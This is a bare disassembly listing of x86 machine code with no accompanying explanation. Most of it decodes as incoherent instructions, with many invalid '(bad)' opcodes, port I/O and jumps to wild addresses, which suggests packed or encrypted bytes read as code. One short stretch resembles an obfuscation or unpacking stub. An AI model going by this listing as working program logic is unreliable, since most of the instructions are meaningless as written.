  40cdc4:	in     eax,0xac
  40cdc6:	sti    
  40cdc7:	jo     0x40cd55
  40cdc9:	pushf  
  40cdca:	loope  0x40cde2
  40cdcc:	dec    edi
  40cdcd:	and    ch,cl
  40cdcf:	pushf  
  40cdd0:	lock push ebx
  40cdd2:	es pop ecx
  40cdd4:	shl    BYTE PTR [esi+0x75],1
  40cdd7:	jns    0x40cdb2
  40cdd9:	jge    0x40ce2e
  40cddb:	mov    esp,0xcfa41a0b
  40cde0:	ror    BYTE PTR [ebx],0x38
  40cde3:	test   eax,0x3138a68
  40cde8:	jl     0x40ce19
  40cdea:	scas   al,BYTE PTR es:[edi]
  40cdeb:	outs   dx,BYTE PTR ds:[esi]
  40cdec:	xchg   ebp,eax
  40cded:	jo     0x40ce22
  40cdef:	jmp    0x9f396dc4
  40cdf4:	or     al,0xa1
  40cdf6:	rol    esp,0xa1
  40cdf9:	loope  0x40cda9
  40cdfb:	out    dx,al
  40cdfc:	jp     0x40ce69
  40cdfe:	pusha  
  40cdff:	test   BYTE PTR [edi],cl
  40ce01:	jns    0x40ce03
  40ce03:	ret    0x7ba4
  40ce06:	ins    BYTE PTR es:[edi],dx
  40ce07:	cdq    
  40ce08:	mov    ds:0x908fec12,eax
  40ce0d:	cmp    eax,0xdabf4f2b
  40ce12:	dec    ebp
  40ce13:	sub    eax,edx
  40ce15:	pop    es
  40ce16:	(bad)  
  40ce17:	hlt    
  40ce18:	push   0x65
  40ce1a:	dec    edx
  40ce1b:	sbb    ch,dl
  40ce1d:	mov    bh,0x33
  40ce1f:	clc    
  40ce20:	push   ebx
  40ce22:	mov    ch,0x97
  40ce24:	or     BYTE PTR [eax-0x15],dl
  40ce27:	dec    edx
  40ce28:	popf   
  40ce29:	lods   eax,DWORD PTR ds:[esi]
  40ce2a:	(bad)  
  40ce2b:	aad    0xc2
  40ce2d:	jnp    0x40ce51
  40ce2f:	mov    edx,DWORD PTR [ebp+0x5d3b02c7]
  40ce35:	jne    0x40cdc5
  40ce37:	loopne 0x40cdfa
  40ce39:	cdq    
  40ce3a:	xchg   esi,eax
  40ce3b:	add    bl,dl
  40ce3d:	icebp  
  40ce3e:	add    edx,DWORD PTR [ebp-0x40]
  40ce41:	or     al,0xd0
  40ce43:	je     0x40ce90
  40ce45:	test   eax,0xebd90ff1
  40ce4a:	ja     0x40cea2
  40ce4c:	fild   QWORD PTR [ebx*8+0x4f77ed9d]
  40ce53:	out    0x55,eax
  40ce55:	sub    bh,BYTE PTR [esi]
  40ce57:	jne    0x40ce0d
  40ce59:	adc    BYTE PTR fs:[ecx-0x741de29e],0x64
  40ce61:	fs mov eax,0x95f09fee
  40ce67:	push   eax
  40ce68:	aad    0x17
  40ce6a:	pop    ebp
  40ce6b:	in     al,0xd7
  40ce6d:	iret   
  40ce6e:	enter  0x5721,0xea
  40ce72:	clc    
  40ce73:	xor    edi,ecx
  40ce75:	pop    eax
  40ce76:	sbb    BYTE PTR [edx],0xaf
  40ce79:	iret   
  40ce7a:	rcl    BYTE PTR [edx+esi*1],1
  40ce7d:	cmp    DWORD PTR [ebx],esi
  40ce7f:	jmp    0xcd8a4f5a
  40ce84:	jmp    0x32a1:0x7c57b974
  40ce8b:	sub    ecx,DWORD PTR [eax]
  40ce8d:	int    0x51
  40ce8f:	inc    edx
  40ce90:	mov    esp,0xd36a3576
  40ce95:	and    al,0x82
  40ce97:	inc    ah
  40ce99:	fmul   DWORD PTR [edi-0x5e39f7c9]
  40ce9f:	mov    eax,0xfa07dc7a
  40cea4:	fnstenv [ecx]
  40cea6:	jp     0x40cf0b
  40cea8:	mov    edi,0x5c1bc7d0
  40cead:	mov    edi,0xbcd93b1a
  40ceb2:	fild   DWORD PTR [ebx+0x47b0975d]
  40ceb8:	mov    BYTE PTR [eax],al
  40ceba:	call   0x4699:0xdca4a06f
  40cec1:	call   0x2ba5034b
  40cec6:	pop    esp
  40cec7:	cmp    ebp,esi
  40cec9:	lods   eax,DWORD PTR ds:[esi]
  40ceca:	shl    eax,0x5a
  40cecd:	js     0x40cee7
  40cecf:	lock mov bl,0xdd
  40ced2:	arpl   WORD PTR [eax+0x4a],bp
  40ced5:	jecxz  0x40ce89
  40ced7:	fwait
  40ced8:	inc    esp
  40ced9:	call   0x4924:0xff2039a0
  40cee0:	dec    ecx
  40cee1:	sbb    BYTE PTR [ebx-0x704105b5],cl
  40cee7:	clc    
  40cee8:	sar    BYTE PTR [esi+ecx*8-0x7b3fa5a7],cl
  40ceef:	sbb    edx,DWORD PTR [ecx]
  40cef1:	mov    edi,0x7d12500
  40cef6:	ins    DWORD PTR es:[edi],dx
  40cef7:	shl    DWORD PTR [eax],0xab
  40cefa:	lahf   
  40cefb:	(bad)  
  40cefc:	and    ebp,DWORD PTR [ebx+0x7cdcaa1c]
  40cf02:	push   0x90ece066
  40cf07:	add    al,0xd3
  40cf09:	mov    ebp,0xefabf183
  40cf0e:	pushf  
  40cf0f:	es inc ebp
  40cf11:	add    BYTE PTR [esi],ch
  40cf13:	(bad)  [ebp+0x568f4074]
  40cf19:	sub    esi,DWORD PTR [edi+edx*4+0x73]
  40cf1d:	add    al,0x68
  40cf1f:	sub    ah,BYTE PTR [edx]
  40cf21:	ret    
  40cf22:	mov    al,ds:0x96cc8b45
  40cf27:	push   ds
  40cf28:	(bad)  
  40cf29:	(bad)  
  40cf2a:	outs   dx,BYTE PTR ds:[esi]
  40cf2b:	ins    DWORD PTR es:[edi],dx
  40cf2c:	shl    BYTE PTR [eax-0x798b18c],cl
  40cf32:	je     0x40cf48
  40cf34:	popf   
  40cf35:	add    eax,0xd177e870
  40cf3a:	stos   DWORD PTR es:[edi],eax
  40cf3b:	adc    BYTE PTR [eax+0x76],dh
  40cf3e:	cmc    
  40cf3f:	sub    al,0x6d
  40cf41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf42:	and    BYTE PTR ss:[ecx+0x5b24ad85],dl
  40cf49:	fcom   QWORD PTR [ecx+0x4e0be9e4]
  40cf4f:	and    eax,0x3ac67806
  40cf54:	bound  esi,QWORD PTR [eax]
  40cf56:	mov    ds:0x671bf848,al
  40cf5b:	sub    eax,0x86051ea6
  40cf60:	mov    al,0x1a
  40cf62:	pop    ss
  40cf63:	jecxz  0x40cf32
  40cf65:	lock pop edi
  40cf67:	mov    ebp,0x73fe44d9
  40cf6c:	cs es mov cl,0xa
  40cf70:	cmp    BYTE PTR [esi],bl
  40cf72:	jecxz  0x40cf24
  40cf74:	cmp    eax,0x701a5e9d
  40cf79:	mov    eax,0xc05e110e
  40cf7e:	icebp  
  40cf7f:	adc    dl,BYTE PTR [ebp-0xf8a29ed]
  40cf85:	clc    
  40cf86:	jns    0x40cf7a
  40cf88:	cmp    DWORD PTR [esi+0x50],esi
  40cf8b:	inc    esi
  40cf8c:	cmp    ch,BYTE PTR [esi-0x4c6ff711]
  40cf92:	or     eax,DWORD PTR [ebp+0x2a]
  40cf95:	in     al,0x74
  40cf97:	dec    eax
  40cf99:	xor    bl,BYTE PTR [ecx-0x590563d1]
  40cf9f:	push   ebx
  40cfa0:	loope  0x40cfc4
  40cfa2:	icebp  
  40cfa3:	lds    eax,FWORD PTR [ecx]
  40cfa5:	and    eax,0x7d837c2b
  40cfaa:	or     edi,eax
  40cfac:	pop    esi
  40cfad:	push   esp
  40cfae:	mov    edx,0xbd4a2f46
  40cfb3:	dec    esi
  40cfb4:	xchg   ebp,eax
  40cfb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfb6:	cwde   
  40cfb7:	leave  
  40cfb8:	adc    eax,DWORD PTR [edi-0x1f]
  40cfbb:	jmp    0x73a802cc
  40cfc0:	adc    BYTE PTR [ebp+0x2b6dacfe],dh
  40cfc6:	(bad)  
  40cfc7:	gs push ebx
  40cfc9:	out    dx,eax
  40cfca:	adc    eax,0x6b41e1aa
  40cfcf:	jle    0x40d04a
  40cfd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfd2:	mov    ah,0x6
  40cfd4:	xchg   edx,eax
  40cfd5:	mov    al,0x90
  40cfd7:	les    edx,FWORD PTR [eax]
  40cfd9:	xchg   esi,eax
  40cfda:	hlt    
  40cfdb:	push   0xffffffa1
  40cfdd:	mov    BYTE PTR [ecx+0x18a365cb],cl
  40cfe3:	adc    bh,BYTE PTR [edi]
  40cfe5:	lahf   
  40cfe6:	cmp    eax,0xbf31d600
  40cfeb:	pushf  
  40cfec:	pop    ds
  40cfed:	out    0x2d,eax
  40cfef:	imul   esp,DWORD PTR [ecx+0x19465dd4],0x5e
  40cff6:	popf   
  40cff7:	xchg   edi,eax
  40cff8:	pushf  
  40cff9:	or     DWORD PTR [ebx+esi*8+0x2b],0xe1f5b594
  40d001:	dec    ebp
  40d002:	adc    esp,edx
  40d004:	mov    DWORD PTR [eax+edi*1-0x23],0x2ca17dfb
  40d00c:	pop    eax
  40d00d:	mov    ah,0x1f
  40d00f:	xor    al,0x18
  40d011:	jno    0x40d032
  40d013:	jb     0x40d089
  40d015:	rcl    DWORD PTR [edx+esi*2+0x2de2a42a],0xd8
  40d01d:	imul   ebp,DWORD PTR [eax+0x7f],0x2b511ed7
  40d024:	mov    gs,WORD PTR [esi]
  40d026:	pop    eax
  40d027:	pop    ecx
  40d028:	loope  0x40d053
  40d02a:	mov    ds:0x514f094e,eax
  40d02f:	dec    ebp
  40d030:	(bad)  
  40d031:	sbb    eax,0x94ae4c2
  40d036:	xor    al,0x8f
  40d038:	xor    edi,esp
  40d03a:	adc    ch,BYTE PTR [ecx+0x4a]
  40d03d:	xchg   ebx,eax
  40d03e:	sbb    edx,DWORD PTR ds:0x4c81fdfd
  40d044:	out    dx,eax
  40d045:	cmp    al,0x61
  40d047:	xchg   ebp,eax
  40d048:	sub    ch,BYTE PTR [esi-0x49f34c69]
  40d04e:	ror    DWORD PTR ds:0xbfffd039,1
  40d054:	mov    al,ds:0xaf48e9cb
  40d059:	test   eax,0xf7a424e8
  40d05e:	cld    
  40d05f:	out    dx,eax
  40d060:	pop    edx
  40d061:	cmp    ah,BYTE PTR [ebp+0x5bb3d13a]
  40d067:	add    eax,0x928c5372
  40d06c:	mov    dl,0xd3
  40d06e:	xchg   ebp,eax
  40d06f:	in     al,dx
  40d070:	pop    ecx
  40d071:	sub    eax,0x72045cbf
  40d076:	call   0x2964:0x83e97814
  40d07d:	pop    ss
  40d07e:	scas   al,BYTE PTR es:[edi]
  40d07f:	stos   DWORD PTR es:[edi],eax
  40d080:	test   eax,0xa0bf4fe3
  40d085:	dec    edx
  40d086:	sbb    al,bh
  40d088:	inc    ebp
  40d089:	adc    BYTE PTR [esi+0x7f2cf976],cl
  40d08f:	adc    DWORD PTR [edi],edi
  40d091:	shl    DWORD PTR [edi],1
  40d093:	and    eax,esi
  40d095:	popa   
  40d096:	push   edx
  40d097:	popf   
  40d098:	(bad)  
  40d099:	rcl    BYTE PTR [esi],0x2
  40d09c:	or     eax,0x904148bc
  40d0a1:	sar    BYTE PTR [esi],cl
  40d0a3:	les    edx,FWORD PTR [esi-0x186a66b6]
  40d0a9:	fucomp st(6)
  40d0ab:	add    esi,DWORD PTR [ecx]
  40d0ad:	out    0x95,al
  40d0af:	push   edx
  40d0b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0b1:	adc    bl,BYTE PTR [ecx+0x1d]
  40d0b4:	push   eax
  40d0b5:	cmc    
  40d0b6:	mov    edx,ss
  40d0b8:	rcl    DWORD PTR [edi],1
  40d0ba:	push   esi
  40d0bb:	aaa    
  40d0bc:	push   esi
  40d0bd:	mov    eax,0xeaa11564
  40d0c2:	iret   
  40d0c3:	inc    esp
  40d0c4:	clc    
  40d0c5:	pushf  
  40d0c6:	push   0x6
  40d0c8:	lods   eax,DWORD PTR ds:[esi]
  40d0c9:	inc    esi
  40d0ca:	jmp    0x5134:0xf5a245a8
  40d0d1:	stos   BYTE PTR es:[edi],al
  40d0d2:	jp     0x40d06a
  40d0d4:	jp     0x40d0da
  40d0d6:	loop   0x40d0ce
  40d0d8:	(bad)  
  40d0d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0da:	xor    esi,DWORD PTR [esi]
  40d0dc:	aas    
  40d0dd:	ins    BYTE PTR es:[edi],dx
  40d0de:	out    dx,eax
  40d0df:	mov    dh,0x36
  40d0e1:	lock int 0x5e
  40d0e4:	cmp    edx,DWORD PTR [ecx]
  40d0e6:	or     al,0xee
  40d0e8:	pop    esi
  40d0e9:	(bad)  
  40d0ea:	adc    eax,0xb528bfdd
  40d0ef:	xor    eax,esp
  40d0f1:	mov    gs,WORD PTR [ebx+0x5e]
  40d0f4:	adc    edx,0xdbf0b0db
  40d0fa:	test   DWORD PTR cs:[esi],ebp
  40d0fd:	fsubr  QWORD PTR ss:[edi]
  40d100:	cs inc edi
  40d102:	es repz sub al,al
  40d106:	sbb    ch,ch
  40d108:	mov    dl,0x1c
  40d10a:	jge    0x40d0cf
  40d10c:	call   0xbf03:0xcffc0cd1
  40d113:	dec    ecx
  40d114:	int3   
  40d115:	outs   dx,BYTE PTR ds:[esi]
  40d116:	push   ss
  40d117:	add    dl,BYTE PTR [edi-0x75]
  40d11a:	mov    ebp,0xe882ef33
  40d11f:	mov    edi,esi
  40d121:	xlat   BYTE PTR ds:[ebx]
  40d122:	jg     0x40d119
  40d124:	int3   
  40d125:	sub    DWORD PTR [ebx-0x32533ab9],0xffffffe8
  40d12c:	in     al,dx
  40d12d:	mov    ch,0xab
  40d12f:	repnz fwait
  40d131:	ret    
  40d132:	push   0xffffff8c
  40d134:	jns    0x40d0dc
  40d136:	sti    
  40d137:	xchg   ebp,eax
  40d138:	(bad)  [esi-0x3e]
  40d13b:	xchg   ecx,eax
  40d13c:	mov    BYTE PTR [edi],0xcd
  40d13f:	mov    DWORD PTR [ebx],esi
  40d141:	addr16 dec ecx
  40d143:	lods   al,BYTE PTR ds:[esi]
  40d144:	enter  0x7ef9,0x71
  40d148:	cmp    ah,cl
  40d14a:	sbb    eax,0x5483981c
  40d14f:	(bad)
  40d152:	inc    eax
  40d153:	mov    ss,WORD PTR [esi]
  40d155:	popa   
  40d156:	sbb    dh,BYTE PTR es:[esp+edi*4]
  40d15a:	lds    ebp,FWORD PTR [edi-0x6f]
  40d15d:	mov    edx,DWORD PTR [ebp+0xe]
  40d160:	dec    ebp
  40d161:	leave  
  40d162:	mov    BYTE PTR [ebp-0x1c9347d2],bl
  40d168:	mov    ebx,0xde1533b8
  40d16d:	xor    BYTE PTR [esi-0xd],ah
  40d170:	(bad)  
  40d171:	inc    eax
  40d172:	adc    al,0xd1
  40d174:	pop    ds
  40d175:	test   eax,0xd135463f
  40d17a:	gs jmp 0x9f57:0x1b379762
  40d182:	cmp    edx,ebp
  40d184:	mov    dl,0xc5
  40d186:	(bad)  
  40d187:	jmp    0x40d16f
  40d189:	cmpxchg DWORD PTR [ebx],esi
  40d18c:	les    esi,FWORD PTR [eax+0x31]
  40d18f:	push   0x262c1239
  40d194:	arpl   dx,si
  40d196:	pop    edx
  40d197:	cmp    eax,0x54405c99
  40d19c:	test   eax,edx
  40d19e:	fisttp DWORD PTR [esi+0x4]
  40d1a1:	inc    eax
  40d1a2:	pop    ss
  40d1a3:	push   ecx
  40d1a4:	(bad)  
  40d1a5:	mov    bh,0x88
  40d1a7:	xor    al,0x3
  40d1a9:	test   ecx,edx
  40d1ab:	int    0x76
  40d1ad:	cmp    cl,0x73
  40d1b0:	sbb    BYTE PTR ds:0x2ebc3b35,cl
  40d1b6:	loope  0x40d229
  40d1b8:	or     DWORD PTR [edx+eax*4],0xfffffff7
  40d1bc:	out    0x44,eax
  40d1be:	and    eax,0x87dbed3c
  40d1c3:	enter  0xf640,0xfa
  40d1c7:	(bad)  
  40d1c8:	jp     0x40d1f6
  40d1ca:	sahf   
  40d1cb:	pop    es
  40d1cc:	test   dh,bh
  40d1ce:	daa    
  40d1cf:	aaa    
  40d1d0:	scas   eax,DWORD PTR es:[edi]
  40d1d1:	jl     0x40d222
  40d1d3:	fwait
  40d1d4:	rcr    BYTE PTR [ebx+0x3450c06a],1
  40d1da:	mov    dh,0x57
  40d1dc:	pop    esp
  40d1dd:	clc    
  40d1de:	outs   dx,DWORD PTR ds:[esi]
  40d1df:	loopne 0x40d197
  40d1e1:	sub    BYTE PTR [eax],bh
  40d1e3:	xor    DWORD PTR [esi+0x19333de1],eax
  40d1e9:	(bad)  
  40d1ea:	fs cmp al,0xe4
  40d1ed:	xchg   ebp,eax
  40d1ee:	xchg   ecx,eax
  40d1ef:	inc    ebp
  40d1f0:	cmc    
  40d1f1:	fs push es
  40d1f3:	in     eax,dx
  40d1f4:	sub    edi,ebp
  40d1f6:	xchg   edi,ebx
  40d1f8:	aas    
  40d1f9:	and    bl,BYTE PTR [ebp-0x5189ce43]
  40d1ff:	(bad)  
  40d200:	icebp  
  40d201:	das    
  40d202:	lock push ss
  40d204:	scas   al,BYTE PTR es:[edi]
  40d205:	xchg   edx,eax
  40d206:	xchg   edx,eax
  40d207:	ss jg  0x40d207
  40d20a:	adc    eax,0x1561ef00
  40d20f:	or     DWORD PTR [ebp-0x7df2198a],esi
  40d215:	(bad)  
  40d216:	jg     0x40d274
  40d218:	or     esp,DWORD PTR [ecx-0x1a]
  40d21b:	dec    eax
  40d21c:	rcr    BYTE PTR [eax+ebp*1-0x7d5a4961],cl
  40d223:	pop    eax
  40d224:	xchg   esi,eax
  40d225:	bound  ebp,QWORD PTR [ebp-0x5efb65a9]
  40d22b:	mov    eax,0x477aac3d
  40d230:	sbb    DWORD PTR [ebp+0x6b],ebp
  40d233:	adc    dl,BYTE PTR [edi-0x7a]
  40d236:	dec    esi
  40d237:	mov    bh,0x71
  40d239:	gs out dx,eax
  40d23b:	hlt    
  40d23c:	push   0xc6a7738e
  40d241:	cmp    ch,BYTE PTR [ecx+0x4b63af03]
  40d247:	adc    al,0x3e
  40d249:	pusha  
  40d24a:	rol    DWORD PTR [ebx-0x66],cl
  40d24d:	pusha  
  40d24e:	loopne 0x40d2c4
  40d250:	icebp  
  40d251:	fild   WORD PTR [edx-0x1ba827e]
  40d257:	sub    ch,ch
  40d259:	test   al,0x26
  40d25b:	fldcw  WORD PTR [ecx+0x4ba026eb]
  40d261:	xchg   ebx,eax
  40d262:	mov    WORD PTR [ecx+eiz*4-0x3064b509],es
  40d269:	xor    dl,bl
  40d26b:	rol    BYTE PTR ds:0xc0b78810,1
  40d271:	pop    esp
  40d272:	or     DWORD PTR [ebp+0x72f8118c],ecx
  40d278:	xor    al,BYTE PTR [eax]
  40d27a:	cmp    ecx,eax
  40d27c:	jne    0x408ae2
  40d282:	mov    eax,DWORD PTR [ebp-0x4]
  40d285:	xor    eax,esi
  40d287:	add    eax,edi
  40d289:	mov    DWORD PTR [ebp-0x10],eax
  40d28c:	mov    ebx,0x756654
  40d291:	add    ebx,0x567645
  40d297:	jmp    0x40f637
  40d29c:	iret   
  40d29d:	jmp    0x40d284
  40d29f:	sub    cl,0x9a
  40d2a2:	cli    
  40d2a3:	in     al,dx
  40d2a4:	xchg   ebx,eax
  40d2a5:	sbb    al,0x4b
  40d2a7:	or     dl,BYTE PTR [edi+0x2f3034d3]
  40d2ad:	sub    edi,DWORD PTR [ebx+0x7b]
  40d2b0:	(bad)  
  40d2b1:	sahf   
  40d2b2:	jnp    0x40d32f
  40d2b4:	shl    DWORD PTR [ecx],cl
  40d2b6:	mov    ecx,0x937408f1
  40d2bb:	ret    0x1b96
  40d2be:	imul   esi,DWORD PTR [eax+0x7cea9c00],0x238c3a15
  40d2c8:	hlt    
  40d2c9:	push   0xcbce1c39
  40d2ce:	test   dh,bh
  40d2d0:	mov    edi,0xc295e4ba
  40d2d5:	xor    BYTE PTR [ebp+0x395e2a27],dh
  40d2db:	pushf  
  40d2dc:	cmp    esi,DWORD PTR [edx-0x69]
  40d2df:	push   esp
  40d2e0:	cmp    eax,0x283c4a8a
  40d2e5:	mov    bl,ch
  40d2e7:	call   0x6c6cfd3b
  40d2ec:	pushf  
  40d2ed:	int    0xc3
  40d2ef:	sub    DWORD PTR [ebp+0x60],ecx
  40d2f2:	push   0x9e856380
  40d2f7:	adc    cl,BYTE PTR [ecx+0xd]
  40d2fa:	ret    0xa459
  40d2fd:	xchg   ebx,eax
  40d2fe:	jle    0x40d2fb
  40d300:	jae    0x40d322
  40d302:	aad    0x28
  40d304:	lods   al,BYTE PTR ds:[esi]
  40d305:	inc    esp
  40d306:	sbb    DWORD PTR [edx+0x14],esp
  40d309:	mov    ds:0xceafcd9b,al
  40d30e:	dec    eax
  40d30f:	inc    ebx
  40d310:	dec    edi
  40d311:	fwait
  40d312:	and    eax,0x50afc82c
  40d317:	cmp    BYTE PTR [edi+0x1a],bh
  40d31a:	mov    edi,0x5ac7d30
  40d31f:	mov    eax,ds:0xb75bf95a
  40d324:	and    eax,0x5e9daad5
  40d329:	sbb    DWORD PTR [ebp+0x1368dd26],ebx
  40d32f:	sbb    BYTE PTR [edx+edx*2],bl
  40d332:	xor    dh,BYTE PTR [ebp+0x79]
  40d335:	fsub   st,st(3)
  40d337:	mov    BYTE PTR [esi],dl
  40d339:	out    dx,eax
  40d33a:	or     al,BYTE PTR [edi+ebx*1+0x40]
  40d33e:	inc    eax
  40d33f:	jle    0x40d335
  40d341:	inc    ebx
  40d342:	sub    al,0xc2
  40d344:	mov    WORD PTR [edx+0x7f],es
  40d347:	imul   eax,esp,0x60
  40d34a:	stos   BYTE PTR es:[edi],al
  40d34b:	adc    al,0x2e
  40d34d:	int    0xf3
  40d34f:	jp     0x40d32e
  40d351:	int3   
  40d352:	rcr    BYTE PTR [esi+0xad09164],cl
  40d358:	mov    ecx,0x57ce1cc8
  40d35d:	cli    
  40d35e:	push   eax
  40d35f:	adc    ecx,DWORD PTR [ecx+eax*8-0x52ca1003]
  40d366:	adc    eax,0x68a40250
  40d36b:	or     DWORD PTR [esi],eax
  40d36d:	rcl    BYTE PTR [edx+edx*2],0xa6
  40d371:	add    esp,ecx
  40d373:	adc    al,0x7d
  40d375:	aad    0x5b
  40d377:	xchg   esi,eax
  40d378:	pop    ds
  40d379:	cmp    eax,0x52d5af14
  40d37e:	into   
  40d37f:	push   ds
  40d380:	int    0xb3
  40d382:	pop    ebx
  40d383:	mov    ds,WORD PTR [edx-0x3ff78917]
  40d389:	ja     0x40d329
  40d38b:	mov    bh,0x34
  40d38d:	fild   WORD PTR [ebx-0x2ef3dd16]
  40d393:	jge    0x40d3de
  40d395:	sahf   
  40d396:	jns    0x40d3f4
  40d398:	push   ss
  40d399:	xor    al,0xb1
  40d39b:	push   esi
  40d39c:	dec    eax
  40d39d:	cdq    
  40d39e:	xchg   edi,eax
  40d39f:	xor    cl,BYTE PTR [esi+eiz*2]
  40d3a2:	out    0xee,al
  40d3a4:	mov    esi,0xd20b4b00
  40d3a9:	inc    edi
  40d3aa:	lahf   
  40d3ab:	push   ebx
  40d3ac:	icebp  
  40d3ad:	push   0xffffffb0
  40d3af:	or     edi,DWORD PTR [eax+ecx*1-0x1f4875cc]
  40d3b6:	retf   0x42b9
  40d3b9:	xor    BYTE PTR [ecx-0x38],ah
  40d3bc:	or     al,0xd6
  40d3be:	jne    0x40d38a
  40d3c0:	cwde   
  40d3c1:	pusha  
  40d3c2:	in     al,0x1c
  40d3c4:	inc    esp
  40d3c5:	(bad)  
  40d3c7:	mov    edx,0xb3d623b1
  40d3cc:	(bad)  
  40d3cd:	xor    al,0xe8
  40d3cf:	ss inc ebx
  40d3d1:	test   eax,0x98fb4646
  40d3d6:	xchg   edx,eax
  40d3d7:	aad    0x11
  40d3d9:	mov    BYTE PTR [ecx+esi*2+0x36],0x16
  40d3de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3df:	outs   dx,DWORD PTR ds:[esi]
  40d3e0:	add    BYTE PTR [esi+0x2c964e47],dh
  40d3e6:	push   0x790e3e92
  40d3eb:	out    0x77,eax
  40d3ed:	mov    BYTE PTR [edi-0x1380a28c],bl
  40d3f3:	lods   eax,DWORD PTR ds:[esi]
  40d3f4:	pusha  
  40d3f5:	pop    esi
  40d3f6:	es add eax,0xbe0a90c6
  40d3fc:	in     eax,0x86
  40d3fe:	dec    ebx
  40d3ff:	imul   ebp,DWORD PTR [eax-0x5d7ea209],0xa5bbd0a0
  40d409:	and    esp,DWORD PTR [eax+0x65]
  40d40c:	sbb    eax,0xae228c60
  40d411:	(bad)  
  40d412:	fldenv [eax+0x59]
  40d415:	retf   
  40d416:	adc    al,0xaf
  40d418:	sbb    ecx,DWORD PTR [eax+esi*8]
  40d41b:	mov    edx,0xe502211f
  40d420:	mov    ss:0x13e4c90c,al
  40d426:	(bad)  
  40d427:	fcomip st,st(6)
  40d429:	mov    al,ds:0x3b833263
  40d42e:	cmc    
  40d42f:	arpl   WORD PTR [edx-0x1b],si
  40d432:	or     bl,ah
  40d434:	or     al,0xe7
  40d436:	mov    dh,bh
  40d438:	mov    eax,ds:0xacca8f04
  40d43d:	mov    cl,0x26
  40d43f:	dec    edx
  40d440:	inc    BYTE PTR [esi]
  40d442:	push   ds
  40d443:	mov    es,WORD PTR [eax]
  40d445:	dec    ebx
  40d446:	inc    edx
  40d447:	aas    
  40d448:	xor    DWORD PTR [ecx+0x20f3c327],0x8421c73
  40d452:	xor    BYTE PTR [ecx-0x7ceb879b],ah
  40d458:	jg     0x40d412
  40d45a:	pop    ebx
  40d45b:	sahf   
  40d45c:	stos   DWORD PTR es:[edi],eax
  40d45d:	xor    al,0xb3
  40d45f:	je     0x40d48a
  40d461:	add    dl,al
  40d463:	(bad)  
  40d464:	xchg   ecx,eax
  40d465:	dec    edi
  40d466:	inc    esp
  40d467:	xchg   esp,eax
  40d468:	xlat   BYTE PTR ds:[ebx]
  40d469:	rol    BYTE PTR [eax-0x44],1
  40d46c:	mov    ebx,0xa1fa85b1
  40d471:	ins    DWORD PTR es:[edi],dx
  40d472:	mov    ds:0x2be8c75a,eax
  40d477:	mov    ebp,edi
  40d479:	inc    edx
  40d47a:	jo     0x40d4e5
  40d47c:	pop    ecx
  40d47d:	xchg   edi,eax
  40d47e:	cmc    
  40d47f:	fadd   QWORD PTR [edx]
  40d481:	inc    edx
  40d482:	jmp    0x40d45e
  40d484:	inc    ebp
  40d485:	inc    esi
  40d486:	sub    ch,BYTE PTR [edx]
  40d488:	pop    ss
  40d489:	cwde   
  40d48a:	xor    cl,cl
  40d48c:	out    0xe6,eax
  40d48e:	mov    eax,ds:0x62471916
  40d493:	cmp    DWORD PTR [ebp+0x5adfc5c8],ebx
  40d499:	mov    ds:0x5a7e7d0e,al
  40d49e:	adc    dh,BYTE PTR [eax-0x2a601c55]
  40d4a4:	mov    ebx,0x15649205
  40d4a9:	addr16 pop cx
  40d4ac:	in     al,0x5
  40d4ae:	push   edi
  40d4af:	xchg   BYTE PTR [edx],cl
  40d4b1:	iret   
  40d4b2:	iret   
  40d4b3:	stos   BYTE PTR es:[edi],al
  40d4b4:	test   BYTE PTR [eax-0x2d5d6466],0x34
  40d4bb:	rcl    DWORD PTR [ecx],0xda
  40d4be:	lahf   
  40d4bf:	mov    ds:0x6e9b9a90,eax
  40d4c4:	push   esp
  40d4c5:	popf   
  40d4c6:	jmp    0x2eb45555
  40d4cb:	xchg   edi,eax
  40d4cc:	pand   mm5,QWORD PTR [eax-0xc]
  40d4d0:	cmp    edi,ebp
  40d4d2:	sbb    BYTE PTR [ebp+0x75e00b80],ch
  40d4d8:	inc    esp
  40d4d9:	adc    dh,dh
  40d4db:	call   0xb8971273
  40d4e0:	push   0xa50f798
  40d4e5:	dec    esi
  40d4e6:	sbb    BYTE PTR [ecx+0x2d20fc21],0x5d
  40d4ed:	stc    
  40d4ee:	xchg   ebx,eax
  40d4ef:	in     eax,0x91
  40d4f1:	pop    edx
  40d4f2:	inc    edi
  40d4f3:	xchg   ebp,eax
  40d4f4:	mov    eax,esp
  40d4f6:	pop    ecx
  40d4f7:	and    ebx,DWORD PTR [eax+0x54a80849]
  40d4fd:	ja     0x40d52f
  40d4ff:	fnstcw WORD PTR [edx+0x4f7fb9b0]
  40d505:	int    0x56
  40d507:	ins    BYTE PTR es:[edi],dx
  40d508:	lods   al,BYTE PTR ds:[esi]
  40d509:	sti    
  40d50a:	adc    bl,BYTE PTR [edx+0x72c33fd4]
  40d510:	jl     0x40d557
  40d512:	das    
  40d513:	mov    eax,0xd520dc95
  40d518:	enter  0xb3c1,0xcb
  40d51c:	sbb    ch,BYTE PTR [edx-0x55]
  40d51f:	jb     0x40d53d
  40d521:	mov    ah,0x5a
  40d523:	mov    WORD PTR [edx+eax*2+0x502c0894],ds
  40d52a:	push   ds
  40d52b:	and    DWORD PTR [eax+0x6],esi
  40d52e:	outs   dx,BYTE PTR ds:[esi]
  40d52f:	sbb    al,0xeb
  40d531:	jae    0x40d50c
  40d533:	add    DWORD PTR [edi-0x43],0x488a0e2
  40d53a:	es jae 0x40d4fd
  40d53d:	leave  
  40d53e:	xlat   BYTE PTR ss:[ebx]
  40d540:	addr16 jne 0x40d534
  40d543:	xchg   DWORD PTR [ebx],esp
  40d545:	pop    ss
  40d546:	les    eax,FWORD PTR [ebx-0xc]
  40d549:	mov    bh,0xf3
  40d54b:	inc    eax
  40d54c:	mov    dh,0xd3
  40d54e:	arpl   WORD PTR [ecx+eiz*1-0x68],bp
  40d552:	and    DWORD PTR [esi],edi
  40d554:	xor    al,0x2f
  40d556:	cdq    
  40d557:	outs   dx,DWORD PTR ds:[esi]
  40d558:	out    dx,al
  40d559:	sub    esp,DWORD PTR [ecx+0x4a]
  40d55c:	jno    0x40d582
  40d55e:	pop    ds
